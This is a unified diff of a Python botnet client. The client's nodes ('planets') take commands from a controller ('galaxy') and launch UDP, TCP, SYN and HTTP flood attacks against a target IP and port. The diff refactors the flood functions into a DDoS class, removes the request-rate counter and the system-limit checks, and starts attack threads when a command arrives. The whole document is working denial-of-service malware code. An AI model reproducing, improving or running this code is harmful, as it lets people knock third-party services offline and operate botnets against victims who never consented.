@@ -20,78 +20,86 @@ elif sys.platform == "darwin":
     planet_os = "mac"
 elif sys.platform == "win32":
     planet_os = "windows"
-    import ctypes
 else:
     print("This platform is unsupported.")
     os._exit(0)
 
 
 # functions
-def ddos_udp(target_ip, target_port):
-    """Attempt a DDoS attack on a remote host by spamming large packets of data (UDP ONLY)."""
-    global requests_sent
-    while planet_attacking:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect((str(target_ip), int(target_port)))
-            s.sendto(os.urandom(10240), (str(target_ip), int(target_port)))
+class DDoS:
+    def __init__(self, target_ip, target_port, flood_type):
+        self.target_ip = target_ip
+        self.target_port = target_port
+        if flood_type == "udp":
+            self.ddos_udp()
+        if flood_type == "tcp":
+            self.ddos_tcp()
+        if flood_type == "syn":
+            self.ddos_syn()
+        if flood_type == "http":
+            self.ddos_http()
+
+
+    def ddos_udp(self):
+        """Attempt a DDoS attack on a remote host by spamming large packets of data (UDP ONLY)."""
+        while planet_attacking:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.connect((str(self.target_ip), int(self.target_port)))
+                s.sendto(os.urandom(10240), (str(self.target_ip), int(self.target_port)))
+                s.close()
+            except IOError:
+                time.sleep(1)
+        if "s" in locals():
             s.close()
-            requests_sent += 1
-        except IOError:
-            time.sleep(10)
 
 
-def ddos_tcp(target_ip, target_port):
-    """Attempt a DDoS attack on a remote host by spamming large packets of data (TCP ONLY)."""
-    global requests_sent
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    while planet_attacking:
-        try:
-            s.connect((str(target_ip), int(target_port)))
-            s.setblocking(0)
-            s.sendto(os.urandom(10240), (str(target_ip), int(target_port)))
-            requests_sent += 1
-        except IOError:
-            time.sleep(10)
-    if "s" in locals():
-        s.close()
-
-
-def ddos_syn(target_ip, target_port):
-    """Attempt a DDoS attack on a remote host by spamming connections and disconnections."""
-    global requests_sent
-    while planet_attacking:
-        try:
-            s = socket.socket()
-            s.connect((str(target_ip), int(target_port)))
+    def ddos_tcp(self):
+        """Attempt a DDoS attack on a remote host by spamming large packets of data (TCP ONLY)."""
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        while planet_attacking:
+            try:
+                s.setblocking(0)
+                s.sendto(os.urandom(10240), (str(self.target_ip), int(self.target_port)))
+            except IOError:
+                time.sleep(1)
+        if "s" in locals():
             s.close()
-            requests_sent += 1
-        except IOError:
-            time.sleep(10)
-    if "s" in locals():
-        s.close()
 
 
-def ddos_http(target_ip, target_port):
-    """Attempt a DDoS attack on a remote host by spamming HTTP GET requests."""
-    global requests_sent
-    src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-    while planet_attacking:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((str(target_ip), int(target_port)))
-            s.sendto(
-                (f"GET /{target_ip} HTTP/1.1\r\n").encode("ascii"),
-                (str(target_ip), int(target_port)),
-            )
-            s.sendto(
-                (f"Host: {src_ip} \r\n\r\n").encode("ascii"),
-                (str(target_ip), int(target_port)),
-            )
+    def ddos_syn(self):
+        """Attempt a DDoS attack on a remote host by spamming connections and disconnections."""
+        while planet_attacking:
+            try:
+                s = socket.socket()
+                s.connect((str(self.target_ip), int(self.target_port)))
+                s.close()
+            except IOError:
+                time.sleep(1)
+        if "s" in locals():
             s.close()
-            requests_sent += 1
-        except IOError:
-            time.sleep(10)
+
+
+    def ddos_http(self):
+        """Attempt a DDoS attack on a remote host by spamming HTTP GET requests."""
+        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+        while planet_attacking:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((str(self.target_ip), int(self.target_port)))
+                s.sendto(
+                    (f"GET /{self.target_ip} HTTP/1.1\r\n").encode("ascii"),
+                    (str(self.target_ip), int(self.target_port)),
+                )
+                s.sendto(
+                    (f"Host: {src_ip} \r\n\r\n").encode("ascii"),
+                    (str(self.target_ip), int(self.target_port)),
+                )
+                s.close()
+            except IOError:
+                time.sleep(1)
+        if "s" in locals():
+            s.close()
 
 
 def exit_handler(*args):
@@ -189,27 +197,12 @@ def connection_handler():
                     else:
                         print("Recieved DDoS command.")
                     target_ip, target_port, flood_type = data
-                    attack_thread_count = int(planet_threads) * 2
-                    if planet_os == "windows":
-                        system_limits = int(ctypes.windll.msvcrt._getmaxstdio())
-                    else:
-                        system_limits = int(os.popen("/usr/bin/ulimit -n").read().strip())
-                    if attack_thread_count >= system_limits:
-                        attack_thread_count = system_limits - 128
+                    attack_thread_count = int(planet_threads) - 1
+                    if attack_thread_count == 0:
+                        attack_thread_count = 1
                     planet_attacking = True
-                    Thread(target=ddos_check_reqs).start()
-                    if flood_type == "udp":
-                        for _ in range(attack_thread_count):
-                            Thread(target=ddos_udp, args=(target_ip, target_port)).start()
-                    elif flood_type == "http":
-                        for _ in range(attack_thread_count):
-                            Thread(target=ddos_http, args=(target_ip, target_port)).start()
-                    elif flood_type == "syn":
-                        for _ in range(attack_thread_count):
-                            Thread(target=ddos_syn, args=(target_ip, target_port)).start()
-                    else:
-                        for _ in range(attack_thread_count):
-                            Thread(target=ddos_tcp, args=(target_ip, target_port)).start()
+                    for _ in range(attack_thread_count):
+                        Thread(target=DDoS, args=(target_ip, target_port, flood_type)).start()
                     planet_socket.send(f"planet ID: {planet_id} attacking".encode())
                     print(
                         f"Attacking! (IP: {target_ip} | Port: {target_port} | Type: {flood_type})"
@@ -234,16 +227,6 @@ def connection_handler():
         planet_attacking = False
 
 
-def ddos_check_reqs():
-    """Calculate DDoS requests per second."""
-    while planet_attacking:
-        old_requests_sent = requests_sent
-        time.sleep(5)
-        requests_sent_5_sec = requests_sent - old_requests_sent
-        requests_sent_1_sec = requests_sent_5_sec / 5
-        print(f"Requests Per Second: {requests_sent_1_sec}")
-
-
 # exit handler
 signal(SIGINT, exit_handler)
 
@@ -257,8 +240,7 @@ planet_id = ""
 planet_attacking = False
 planet_online = False
 planet_shutting_down = False
-requests_sent = 0
-
+planet_socket = ""
 
 # connect to galaxy
 connect_to_galaxy()
